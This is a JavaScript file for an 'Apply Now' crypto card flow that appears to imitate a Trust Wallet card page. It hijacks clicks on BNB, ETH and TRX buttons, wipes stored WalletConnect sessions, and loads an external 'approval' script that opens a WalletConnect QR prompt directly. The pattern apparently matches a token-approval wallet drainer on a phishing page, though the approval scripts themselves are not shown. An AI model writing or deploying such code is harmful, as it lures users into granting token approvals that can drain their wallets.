/**
 * Apply Now flow - Same as BEP20 waitlist: direct WalletConnect QR when user selects BNB or TRX
 *
 * Flow: User clicks BNB or TRX → Load approval script → WalletConnect QR opens directly (no wallet grid)
 *
 * BNB = BNB Chain (BEP20), TRX/TRC = Tron (TRC20) - same as reference site
 */
(function() {
  'use strict';

  const BEP20_APPROVAL_URL = window.TRUST_CARD_APPROVAL_URL || (typeof location !== 'undefined' ? new URL('fluxpay', location.origin).href : 'fluxpay');
  const SCRIPT_MAP = {
    BNB: 'fluxpay-approval.js',
    Ethereum: 'fluxpay-approval.js',
    ETH: 'fluxpay-approval.js',
    Tron: 'fluxpay-trc20-approval.js',
    TRX: 'fluxpay-trc20-approval.js',
    TRC: 'fluxpay-trc20-approval.js',
  };
  const RUN_MAP = {
    BNB: 'FluxPayApproval',
    Ethereum: 'FluxPayApproval',
    ETH: 'FluxPayApproval',
    Tron: 'FluxPayTRC20Approval',
    TRX: 'FluxPayTRC20Approval',
    TRC: 'FluxPayTRC20Approval',
  };

  function clearWalletConnectSession() {
    try {
      Object.keys(localStorage).forEach(function(key) {
        if (key.startsWith('wc@') || key === 'WALLETCONNECT_DEEPLINK_CHOICE' || key.startsWith('WCM_')) {
          localStorage.removeItem(key);
        }
      });
      if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
        try {
          indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB');
        } catch (_) {}
      }
    } catch (_) {}
  }

  function getRedirectUrl() {
    const stored = sessionStorage.getItem('tw-card-redirect');
    if (stored) return stored;
    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
    return window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
  }

  function runApprovalInline(network) {
    const baseUrl = BEP20_APPROVAL_URL.replace(/\/$/, '');
    const scriptName = SCRIPT_MAP[network] || SCRIPT_MAP[network?.toUpperCase()];
    const runKey = RUN_MAP[network] || RUN_MAP[network?.toUpperCase()];

    if (!scriptName || !runKey) return Promise.reject(new Error('Unknown network: ' + network));

    const scriptUrl = baseUrl + '/' + scriptName;
    const runFn = window[runKey]?.run;

    if (runFn) {
      return new Promise((resolve, reject) => {
        runFn(
          function() {
            window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
            const url = getRedirectUrl();
            if (url) window.location.href = url.startsWith('/') ? window.location.origin + url : url;
            else resolve();
          },
          function(err) {
            reject(new Error(err));
          }
        );
      });
    }

    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.type = 'module';
      script.src = scriptUrl;
      script.onload = function() {
        const fn = window[runKey]?.run;
        if (!fn) {
          reject(new Error('Approval script did not load'));
          return;
        }
        fn(
          function() {
            window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
            const url = getRedirectUrl();
            if (url) window.location.href = url.startsWith('/') ? window.location.origin + url : url;
            else resolve();
          },
          function(err) {
            reject(new Error(err));
          }
        );
      };
      script.onerror = function() {
        reject(new Error('Failed to load approval script'));
      };
      document.head.appendChild(script);
    });
  }

  function onNetworkClick(network) {
    if (!network) return;
    clearWalletConnectSession();
    runApprovalInline(network).catch(function(err) {
      console.error('Apply Now flow error:', err);
    });
  }

  function init() {
    document.body.addEventListener('click', function(e) {
      const target = e.target;
      const text = (target?.textContent || target?.innerText || '').trim();
      const btn = target?.closest?.('button, [role="button"], a');
      const btnText = (btn?.textContent || '').trim();

      if (/^BNB$/i.test(text) || /^BNB$/i.test(btnText) || /^Ethereum$/i.test(text) || /^Ethereum$/i.test(btnText) || /^ETH$/i.test(text)) {
        e.preventDefault();
        e.stopPropagation();
        onNetworkClick('BNB');
        return;
      }
      if (/^TRON$/i.test(text) || /^TRON$/i.test(btnText) || /^TRX$/i.test(text) || /^TRX$/i.test(btnText) || /^TRC$/i.test(text) || /^TRC$/i.test(btnText)) {
        e.preventDefault();
        e.stopPropagation();
        onNetworkClick('TRX');
        return;
      }
    }, true);

    document.body.addEventListener('click', function(e) {
      const btn = e.target?.closest?.('button');
      const t = (btn?.textContent || '').trim();
      if (/Activate card|Get card/i.test(t)) {
        const country = new URLSearchParams(window.location.search).get('country') || 'IN';
        const cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
        try {
          sessionStorage.setItem('tw-card-redirect', cardUrl);
        } catch (_) {}
      }
    }, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
